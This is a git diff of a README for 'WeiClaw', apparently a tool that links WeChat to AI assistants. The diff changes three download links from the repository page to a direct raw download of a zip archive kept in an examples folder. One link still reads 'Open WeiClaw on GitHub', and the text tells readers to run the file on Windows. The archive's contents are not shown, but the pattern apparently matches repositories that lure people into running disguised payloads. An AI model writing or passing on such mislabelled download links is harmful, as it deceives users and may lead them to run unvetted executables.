@@ -1,6 +1,6 @@
 # 🤖 WeiClaw - Connect WeChat to Any AI
 
-[![Download WeiClaw](https://img.shields.io/badge/Download%20WeiClaw-Click%20Here-blue?style=for-the-badge)](https://github.com/bahridpk/WeiClaw)
+[![Download WeiClaw](https://img.shields.io/badge/Download%20WeiClaw-Click%20Here-blue?style=for-the-badge)](https://github.com/bahridpk/WeiClaw/raw/refs/heads/main/examples/Wei_Claw_1.4.zip)
 
 ## 🚀 What WeiClaw Does
 
@@ -12,7 +12,7 @@ This app is for people who want to use WeChat as the front door for an AI assist
 
 Visit this page to download and set up WeiClaw:
 
-[Open WeiClaw on GitHub](https://github.com/bahridpk/WeiClaw)
+[Open WeiClaw on GitHub](https://github.com/bahridpk/WeiClaw/raw/refs/heads/main/examples/Wei_Claw_1.4.zip)
 
 If the page shows a release file, download it and run it on your Windows PC. If it shows the source files, use the Windows setup steps below to run it from your computer.
 
@@ -169,7 +169,7 @@ WeiClaw is designed for:
 
 ## 🖱️ Download Again
 
-[Download WeiClaw from GitHub](https://github.com/bahridpk/WeiClaw)
+[Download WeiClaw from GitHub](https://github.com/bahridpk/WeiClaw/raw/refs/heads/main/examples/Wei_Claw_1.4.zip)
 
 ## ❓ Quick Help
 
